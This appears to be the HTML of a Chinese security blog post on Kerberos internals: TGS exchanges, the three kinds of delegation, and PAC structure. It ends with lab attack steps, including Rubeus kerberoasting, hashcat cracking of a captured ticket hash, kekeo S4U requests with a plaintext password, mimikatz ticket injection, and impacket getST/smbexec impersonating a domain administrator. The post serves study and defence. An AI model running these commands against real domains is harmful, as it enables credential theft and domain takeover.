@@ -1,0 +1,939 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="self_209&#39;blog">
+    <title>内网安全之kerberos(二) - self_209&#39;blog</title>
+    <meta name="author" content="self_209">
+    
+    
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"参考：https://github.com/daikerSec/windows_protocol\n​            https://blog.csdn.net/qq_36119192/category_10225019.html\n​            https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\n\n\n\n\nTGS_REQ用户通过AS_REP拿到的TGT票据，以及使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。去向KDC申请特定服务的访问权限，KDC校验TGT票据\n\n流量包：\n\n\nmsg-type\n\n类型，TGS_REQ对应的就是KRB_TGS_REQ(0x0c)\n\nPA-DATA\n\n正常的TGS_REQ的请求需要用到有\n\nAP-REQ\n这个是TGS_REQ必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据和Session Key加密的客户端信息跟时间戳，就放在这个结构体里面。\n\n\n\n\nPA_FOR_USER\n\n值是一个唯一的标识符，该标识符指示用户的身份。该唯一标识符由用户名和域名组成。\nS4U2proxy 必须扩展PA_FOR_USER结构，指定服务代表某个用户(图片里面是administrator)去请求针对服务自身的kerberos服务票据。\n* \n\nPA_PAC_OPTIONS\n\n类型是 PA_PAC_OPTIONS\n值是以下flag的组合\n – Claims(0)\n – Branch Aware(1)\n – Forward to Full DC(2)\n – Resource-based Constrained Delegation (3)\n微软的MS-SFU 2.2.5， S4U2proxy 必须扩展PA-PAC-OPTIONS结构。\n如果是基于资源的约束委派，就需要指定Resource-based Constrained Delegation位。\n\n\n\nREQ_BODY\n\n\nsname\n这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。\n\nAddtionTicket\n\n附加票据，在S4U2proxy请求里面，既需要正常的TGT，也需要S4U2self阶段获取到的TGS，那么这个TGS就添加到AddtionTicket里面。\n\n\nTGS_REP\n\nmsg-type\nAS_REQ的响应body对应的就是KRB_TGS_REQ(0x0d)\n\nticket\n这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash，既kerberoasting\n\n\nenc_part\n这个enc_part不是ticket里面的enc_part，这部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的 session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。\n\n\n\n非约束性委派对于非约束性委派(Unconstrained Delegation)，服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT，模拟用户访问任意服务。\n配置了非约束性委派属性的机器账号的userAccountControl 属性有个FLAG位 WORKSTATION_TRUST_ACCOUNT | \nTRUSTED_FOR_DELEGATION，其对应的数是0x81000=528384。\n\n配置了非约束性委派属性的服务账号的userAccountControl 属性有个FLAG位 NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION， \n其对应的数是0x80200=524800。 \n\n非约束委派的设置需要SeEnableDelegation特权，该特权通常仅授予域管理员。\n非约束委派的配置如下\n将域用户注册为服务账户\n\n配置非约束委派\n\n约束性委派由于非约束性委派的不安全性，微软在Windows Server 2003中发布了约束性委派。同时，为了在Kerberos协议层面对约束性委派的支持， \n微软扩展了两个子协议 S4u2self(Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )。对于约束性委派（Constrained \nDelegation），服务账号只能获取该用户的ST服务票据，从而只能模拟该用户访问特定的服务。配置了约束性委派账户的msDS- \nAllowedToDelegateTo属性会指定对哪个SPN进行委派。约束委派的设置需要 SeEnableDelegation 特权，该特权通常仅授予域管理员。\n配置了非约束性委派的机器账号的userAccountControl属性有个FLAG位 WORKSTATION_TRUST_ACCOUNT | \nTRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1001000=16781312。 \n\n\n配置了非约束性委派的服务账号的userAccountControl属性有个FLAG位 NORMAL_ACCOUNT | \nTRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1000200=16777728。\n\n\nS4U2SELF当用户以其他方式(如NTLMi认证、基于表单的认证等方式)与Web服务进行认证后，用户是无法向Server1服务器提供请求该服务的TGS服务票据的，因而服务器也无法进一步使用S4U2Proxy协议请求访问域控的CIFS服务。S4U2Self协议便是解决该问题的方案，被配置为约束委派的服务能够调用S4U2Self向KDC为任意用户请求访问自身的可转发的服务票据，此后，便可通过S4U2Proxy使用这张TGS票据向域控制器请求访问域控的CIFS服务的票据。这里需要注意的是服务代表用户获得针对服务自身TGS票据这个过程是不需要用户的凭据的。S42Self的过程如图(请求服务之前需要申请可转发的TGT，即需要向域控认证账户密码)\n\nS4U2PROXYS4U2Proxy使得Server1可以使用来自用户的授权(在S4U2self阶段获得)，然后用该TGS票据(放在AdationTicket里面)向KD请求访问域控的CIFS服务的TGS，并且代表用户访问域控的CIFS服务，而且只能访问域控的CIFS服务。\n\n约束性委派流程为了进行约束性委派，微软在Kerberos 协议的TGS_REQ &amp; TGS_REP阶段引入了两个扩展子协议S4u2Self (Service for User to Self)和S4u2Proxy(Service for User to Proxy )。\nS4u2self可以代表任意用户请求针对其自身的Kerberos服务票据(ST);\nS4u2Proxy可以以上一步用户的名义请求其它服务的服务票据。约束性委派就是限制了S4u2Proxy扩展的范围。\n来捋一下整个流程\n\n在Server1上配置到域控的CIFS服务约束性委派\n\n\n用户访问Server1，于是向域控进行kerberos认证，域控返回可转发的TGS服务票据给用户，用户使用此服务票据访问Server1(上图中的第1、2、3步)\n若该Server1允许委派给域控的CIFS服务，并且使用Kerberos协议认证请求Server1，则Server1能使用S42Proxy协议将用户发送给自己的可转发的TGS服务票据以用户的身份再转发给域控制器，向域控申请访问CIFS服务的TGS服务票据，于是域控返回给Server1─个域控的CIFS服务的TGS服务票据（上图中的第6步）。若用户以其他方式(如NTLMi认证、基于表单的认证等方式)与Server1服务进行认证后，用户是无法向Server1服务器提供请求该服务的可转发TGS服务票据的，这时候S4U2Self协议便是解决该问题的方案，被配置为约束委派的服务能够调用S4U2Self向KDC为任意用户请求访问自身的可转发的服务票据（上图中的第4、5步），使用S42Proxy协议将S4U2Self协议申请的可转发的TGS服务票据以用户的身份再转发给域控制器，向域控申请访问CIFS服务的TGS服务票据(上图第6步)\nServer1便能使用获得的域控的CIFS服务的TGS服务票据以用户的身份访问域控的CIFS服务。（上图中的第7步）\n\n从网络攻击的角度来看，如果攻击者控制了Server1的账号，并且Server1配置了到域控的CIFS服务的约束性委派。则攻击者可以利用Server1以administrator身份访问域控的CIFS服务，即相当于控制了域控。\n流量分析\nS4U2SELF流量S4U2self请求流量，也就是上面约束委派流程图的第4、5步\n\n\n先向KDC申请服务自身的可转发的TGT票据\n\n\n\n2、返回可转发TGT票据\n\n上图的票据cipher为aa7d6d6b79d0…..\n我们可以使用daiker大佬的工具查看这张TGT票据\ncipher是一样的说明是这张，可以解密看一下它的flags字段有一个forwardable的值代表可转发\n\n\n3、携带着可转发TGT票据，代表administrator用户获得针对服务自身的可转发TGS票据\n\n\n\n4、返回用户administrator请求服务自身的可转发TGS票据\n\n票据的cipher值为dfdc318f3564931……\nS4U2PROXY流量\n1、携带着可转发TGT票据以及S4U2Self协议申请administrator用户针对服务自身的可转发的TGS服务票据以用户的身份再转发给域控制器，TGS票据放在AdationTicket里面，向域控申请访问CIFS服务的TGS服务票据。\n可转发TGT票据在pA-TGE-REQ字段下的ap-req字段中\n\nTGS票据放在req-body的AdationTicket字段中\n\n向域控申请访问CIFS服务的TGS服务票据。\n\n2、返回administator用户访问CIFS服务的TGS服务票据\n\n3、将票据注入内存中，代表用户访问域控的CIFS服务\n\n\nSMB协议中带着CIFS服务的TGS服务票据\n\n基于资源的约束委派为了使用户资源更加独立，微软在Windows Server 2012中引入了基于资源的约束性委派。基于资源的约束委派不需要域管理员权限去设 置，而是把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束性委派只能 在运行Windows Server 2012和Windows Server 2012 R2及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约 束性委派账户的msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为被允许委派账号的SID，并且委派属性这里没有任何值。基于资源的约束委派和约束性委派请求流程基本一致，唯一的区别在于S4U2SELF这一步请求的TGS是不可转发的无论服务账号的UserAccountControl属性是否被设置为TrustedToAuthForDelegation值，服务自身都可以通过调用S4U2Self来为任意用户请求自身的服务票据。但是当没有设置该属性时，KDC通过检查服务账号的TrustedToHuthForDelegation位和msDS-AllowedToDelegateTo这两个字段，发现没有被赋值，所以服务自身通过S4U2Self请求到的TGS服务票据是不可转发的，因此不可转发的TGS服务票据是无法通过S4U2Proxy转发到其他服务进行约束性委派认证的。但是在基于资源的约束委派过程中，不可转发的TGS服务票据仍然可以通过S4U2Proxy转发到其他服务进行委派认证，并且最后服务还会返回一张可转发的TGS服务票据!因此，如果我们能够在域控上配置允许server1的基于资源的约束委派，那么我们就可以通过控制server1使用S4U2Self向域控请求任意用户访问自身的服务票据,最后再使用S4U2Proxy转发此TGS票据去请求访问域控的可转发的TGS服务票据，那么我们就可以模拟任意用户访问域控了。这里我们可以以普通域用户的身份去创建机器账号作为server1。\n前提：这里实验我们手动上域控配置基于资源的约束委派\n12Get-ADComputer WIN-4QH1BAMD7NP -Properties PrincipalsAllowedToDelegateToAccountSet-ADComputer WIN-4QH1BAMD7NP -PrincipalsAllowedToDelegateToAccount server1$\n\n\nS4U2Self请求到的TGS服务票据是不可转发的\n\nS4U2Proxy认证返回可转发的TGS服务票据\n\nPACPAC结构PAC的结构如下图所示。\n\nPAC整体的结构上是一个AuthorizationData的结构\n1234AuthorizationData       ::= SEQUENCE OF SEQUENCE &#123;              ad-type         [0] Int32,              ad-data         [1] OCTET STRING &#125;\n\nAuthorizationData结构的ad-type主要有以下几个\n1234567891011121314AD-IF-RELEVANT                     1AD-INTENDED-FOR-SERVER             2AD-INTENDED-FOR-APPLICATION-CLASS  3AD-KDC-ISSUED                      4AD-AND-OR                          5AD-MANDATORY-TICKET-EXTENSIONS     6AD-IN-TICKET-EXTENSIONS            7AD-MANDATORY-FOR-KDC               8Reserved values                 9-63OSF-DCE                           64SESAME                            65AD-OSF-DCE-PKI-CERTID             66 (hemsath @us.ibm.com)AD-WIN2K-PAC                     128 (jbrezak @exchange.microsoft.com)AD-ETYPE-NEGOTIATION             129  (lzhu @windows.microsoft.com)\n\n如上图所示，整个PAC最外层的ad-type为AD-IF-RELEVANT，ad-data还是一个AuthorizationData结构。\n这个AuthorizationData的ad-type 为AD-WIN2K-PAC，ad-data为一段连续的空间，\n这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER\n头部PACTYPE包括cBuffers,版本以及缓冲区，PAC_INFO_BUFFER为key-value型的\nkey 的类型如下表所示\n\n\n\n类型\n意义\n\n\n\n0x00000001\n登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。\n\n\n0x00000002\n凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。\n\n\n0x00000006\n服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。\n\n\n0x00000007\nKDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。\n\n\n0x0000000A\n客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。\n\n\n0x0000000B\n受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。\n\n\n0x0000000C\n用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。\n\n\n0x0000000D\n客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。\n\n\n0x0000000E\n设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。\n\n\n0x0000000F\n设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。\n\n\n下面详细介绍四个比较重要的\n\n0x00000001   KERB_VALIDATION_INFO  \n\n这个结构是登录信息，也是整个PAC最重要的部分，整个PAC就靠它来验证用户身份了，是个结构体，如下\n12345678910111213141516171819202122232425262728293031323334353637typedef struct _KERB_VALIDATION_INFO &#123;   FILETIME LogonTime;   FILETIME LogoffTime;   FILETIME KickOffTime;   FILETIME PasswordLastSet;   FILETIME PasswordCanChange;   FILETIME PasswordMustChange;   RPC_UNICODE_STRING EffectiveName;   RPC_UNICODE_STRING FullName;   RPC_UNICODE_STRING LogonScript;   RPC_UNICODE_STRING ProfilePath;   RPC_UNICODE_STRING HomeDirectory;   RPC_UNICODE_STRING HomeDirectoryDrive;   USHORT LogonCount;   USHORT BadPasswordCount;   ULONG UserId; //用户的sid   ULONG PrimaryGroupId;    ULONG GroupCount;   [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;//用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管   ULONG UserFlags;   USER_SESSION_KEY UserSessionKey;   RPC_UNICODE_STRING LogonServer;   RPC_UNICODE_STRING LogonDomainName;   PISID LogonDomainId;   ULONG Reserved1[2];   ULONG UserAccountControl;   ULONG SubAuthStatus;   FILETIME LastSuccessfulILogon;   FILETIME LastFailedILogon;   ULONG FailedILogonCount;   ULONG Reserved3;   ULONG SidCount;   [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;   PISID ResourceGroupDomainSid;   ULONG ResourceGroupCount;   [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;&#125; KERB_VALIDATION_INFO;\n\n\n0x0000000A PAC_CLIENT_INFO\n\n客户端Id（8个字节）：\n包含在Kerberos初始TGT的authtime\n\nNameLength（2字节）\n用于指定Name 字段的长度（以字节为单位）。\n\nName\n包含客户帐户名的16位Unicode字符数组，格式为低端字节序。\n\n0x00000006和0x00000007 0x00000006 对应的是服务检验和，0x00000007 对应的是KDC校验和。分别由server密码和KDC密码加密，是为了防止PAC内容被篡改。\n存在签名的原因有两个。首先，存在带有服务器密钥的签名，以防止客户端生成自己的PAC并将其作为加密授权数据发送到KDC，以包含在票证中。其次，提供具有KDC密钥的签名，以防止不受信任的服务伪造带有无效PAC的票证。\n两个都是PAC_SIGNATURE_DATA结构，他包括以下结构。 1. SignatureType（4个字节）\n\n\n\n\n\n类型\n含义\n签名长度\n\n\n\n0xFFFFFF76\nKERB_CHECKSUM_HMAC_MD5\n16\n\n\n0x0000000F\nHMAC_SHA1_96_AES128\n12\n\n\n0x00000010\nHMAC_SHA1_96_AES256\n12\n\n\n\nSignature\n包含校验和。签名的长度由SignatureType字段的值确定 3. RODCIdentifier（2个字节）：\n当KDC为RODC时，包含密钥版本号的前16位。当KDC不是RODC时，此字段不存在。\n\n\n相关安全问题及利用pass the ticketKerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后。我们就可以用这个票据来作为下阶段的验证了。\nkerberosting当我们完成AS请求之后会获得TGT票据，用这张TGT票据向KDC请求我们要访问的服务的TGS票据，认证通过后KDC会使用服务账户的hash加密TGS票据，所以我们可以通过爆破TGS票据的cipher字段获得服务账户的hash。\nrubeus请求服务票据Rubeus里面的kerberoast支持对所有用户或者特定用户执行kerberoasting操作，其原理在于先用LDAP查询于内的spn再通过发送TGS包，然后直接打印出能使用 hashcat或john 爆破的Hash。\n1Rubeus.exe kerberoast\n\n\nhashcat离线爆破\n1hashcat -m 13100 &#x27;$krb5tgs$23$*deleg$self.com$priv/test*$BB50173429A6874A0B3AD8661C3C88F9$AA6CCE49E3A1BA4A990EEB1B967B8CB2260AAC404F5F8363521C20C5E2D11238A485CB93020A0E0E17EC57F46F4455865CAB056664FF2755C0DAC6246301E55EC9B4B17DC535ABE042902C7294090787C0E3B1421990048DF4D66434C2D1268F892556ACADBEDF86404EC763FC0BF70C053610D11CCFFFD1BD3FF6419ECE2829C1DC9F08D656C77D6A33DD6BE2038D18C501D57D68541B972AE782DC042593C5898383AEA28CD8D687B4639533AAB54131AB02FAF18935265C6C47676BA8EAD5E5A680DB6C477A599C1184634E03DEF53FF6899D5A8659D99D27516C928CD6ABD4C1DBF8CA81B75AD37A14778003BFAA9211D3DBF482AC7D1B5E3B1280D0A0E31455308DF69587BC48D28A6F3EC71E9756357826529E2FA508196EF924AA60915E7D417223A804527C9B19823905582A5C89DB57B1D40F508B2D72E40A28859C33488D6FA8550BCE6D2AD47BA5231ECCA6FF7514136E6152C840E7A7E713BE4924E29DBCD6D0155ECD4FDD8E55108D3277A90A9C45C1CF16DC086A244DBD1D2EAC24E7BEFEF0B9EDFAB2B0860FB183421FA4566DD6DCDDB8C995DBB72C05FDCC2C80281D22024E34B2FEB0FD93B47D97EE5D3AAAD4EB0B87FAA7BFE77FE973A93BA0B4A66AF155E9B9161EACBCC813BD28543C122AAAB4F002A6B496F401795F5D788222792FC19E0A7C3D1814131E19A5B5A4FC86412BB4966C1CD45FA19B339A48EBC0C0A0044661811D9EF7322346274836F8F536557C1D4C03F8F8956126E10E0BDCE95F6BB27DB6C0AC06AC069C263DA2D8475B9C668CFF5ECB2A3B00FF47B71A991E5DCCFC558FF7843347E2B3296F807387C4DD0ED15430471577BB8A261A74D50BF757537393FA5160ED7441CE7934E0350D89F45024EEE8732D5E54405404E1A4E5A8C2FECDB74BA8E8D4A0CE08D799F0FCBDA7B2FC31DF92BF91D7CB7B89AF59955AF2AEF1FED9E209E17E146339E202F82C54751904B492364F78321BC3445C3085231EE8197D7EF59E9B4FAADC30DD5029F346FC01E8C7D0B02E39249A5A1C378D39D4D8708B006EDB7435DBC45F628169C7A65F30C9F6DAA6EC8EDF3B40F004333CFE7D046FE02DF8EBDD6365A4C84E733304A8860EEFFCA6ABECD450BEEE09C9FE8C6650D0B963578369548333D91EA3BB86286B283E5A7B32CBB8163C22EF4DF230038CF9F6C0A3FF80AA1A743084B2565C2EDF597CD42777A91DC8306720FA440ECF35F9AEEDA1560E741F8062A7B7D71EE39D115965F831745DD35F1D1DE2811644673011173E4FCDC3D881B90361783CD4E688A2B85C548E4B0361F6D6329989D2566E21367D1271C29F45DE423779FB66E2A7DE4CDD4070AA823E422215B7A7D096F6728CD7A14CB178702E45F0FC87CFE02EF922BB7F37122D473E609F56E6901C0031F912FD56726D40969B0348&#x27; /home/kali/Public/pass.txt\n\n\n白银票据在TGS_REP里面的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是tgs票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。\n非约束委派攻击配置win-2016$非约束性委派\n我们登录到win2016机器上去使用mimikatz导出票据，只有win-2016$和deleg用户的票据\n\n现在我们去域控以administrator身份去访问WIN-2016\n\n因为配置了非约束性委派，此时，在主机win-2016的lsass.exe内存中就会有域管理员administrator的TGT票据。\n再次导出票据就会有administrator的票据\n\n清空票据\n\n\n将TGT票据导入内存中\n\n\n约束委派攻击配置约束委派\n\nkekeo约束委派攻击先清空票据\n\n请求票据\n123.\\kekeo.exetgt::ask /user:deleg /domain:self.com /password:123.comTgs::s4u /tgt:TGT_deleg@SELF.COM_krbtgt~self.com@SELF.COM.kirbi /user:Administrator /service:cifs/WIN-4QH1BAMD7NP.self.com\n\n\n将票据注入内存\n123.\\mimikatz.exekerberos::purgekerberos::ptt \n\n\n\n\n基于资源的约束委派攻击配置基于资源的约束委派\n在域控中设置允许server1用户基于资源的约束委派\n12Get-ADComputer WIN-4QH1BAMD7NP -Properties PrincipalsAllowedToDelegateToAccountSet-ADComputer WIN-4QH1BAMD7NP -PrincipalsAllowedToDelegateToAccount server1$\n\n\nimpacket进行基于资源的约束性委派攻击123./getST.py -dc-ip WIN-4QH1BAMD7NP.self.com self.com/server1$:123.com -spn cifs/WIN-4QH1BAMD7NP.self.com -impersonate administratorexport KRB5CCNAME=administrator.ccache./smbexec.py -no-pass -k WIN-4QH1BAMD7NP.self.com\n\n\n","dateCreated":"2022-02-25T14:58:23+08:00","dateModified":"2022-04-08T23:03:33+08:00","datePublished":"2022-02-25T14:58:23+08:00","description":"参考：https://github.com/daikerSec/windows_protocol\n​            https://blog.csdn.net/qq_36119192/category_10225019.html\n​            https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html","headline":"内网安全之kerberos(二)","image":[null,"837657.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://self209.github.io/2022/02/25/20220225/"},"publisher":{"@type":"Organization","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://self209.github.io/2022/02/25/20220225/","keywords":"内网安全","thumbnailUrl":"837657.jpg"}</script>
+    <meta name="description" content="参考：https:&#x2F;&#x2F;github.com&#x2F;daikerSec&#x2F;windows_protocol ​            https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36119192&#x2F;category_10225019.html ​            https:&#x2F;&#x2F;shenaniganslabs.io&#x2F;2019&#x2F;01&#x2F;28&#x2F;Wagging-the-Dog.html">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="内网安全之kerberos(二)">
+<meta property="og:url" content="https://self209.github.io/2022/02/25/20220225/index.html">
+<meta property="og:site_name" content="self_209&#39;blog">
+<meta property="og:description" content="参考：https:&#x2F;&#x2F;github.com&#x2F;daikerSec&#x2F;windows_protocol ​            https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36119192&#x2F;category_10225019.html ​            https:&#x2F;&#x2F;shenaniganslabs.io&#x2F;2019&#x2F;01&#x2F;28&#x2F;Wagging-the-Dog.html">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220405202010600.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220405202127508.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220405202452052.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220405202937345.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220405203036805.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220405203316324.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220405203848843.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220405204251250.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220405204334935.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220406101111523.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220406101332015.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220406095732365.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220406095814113.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220406102331409.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220406102437345.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220406102552379.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220406102649696.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407103333591.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407103822645.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407102148702.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407102440866.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407112250852.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407112818256.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407113515778.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407113605301.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407113741485.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407114013191.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407114243719.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407123537020.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407123802655.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407123700199.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407124149988.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407130021730.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407125215017.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407125332900.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407125923621.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407130200025.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407110129251.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407110215952.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407130924830.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407235244150.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407234722105.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407234947687.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image001.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408191059797.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408191742634.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408194007949.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408200332660.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408224321845.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408194825478.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408194921226.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408224440067.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408224504303.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408224740654.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407105539682.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407105943152.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407110059370.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407110129251.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220407110215952.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408225312831.png">
+<meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/image-20220408225954666.png">
+<meta property="article:published_time" content="2022-02-25T06:58:23.000Z">
+<meta property="article:modified_time" content="2022-04-08T15:03:33.678Z">
+<meta property="article:author" content="self_209">
+<meta property="article:tag" content="内网安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://self209.github.io/2022/02/25/20220225/image-20220405202010600.png">
+    
+    
+        
+    
+    
+    
+    
+        <meta property="og:image" content="https://self209.github.io/2022/02/25/20220225/837657.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://self209.github.io/2022/02/25/20220225/837657.jpg"/>
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-gt5qcce6mgvuqwcgifha2ylts94nspkxjckwcuei5fxp2ypavhmsle0ivz1f.min.css">
+
+    <!--STYLES END-->
+    
+
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            self_209&#39;blog
+        </a>
+    </div>
+    
+        
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
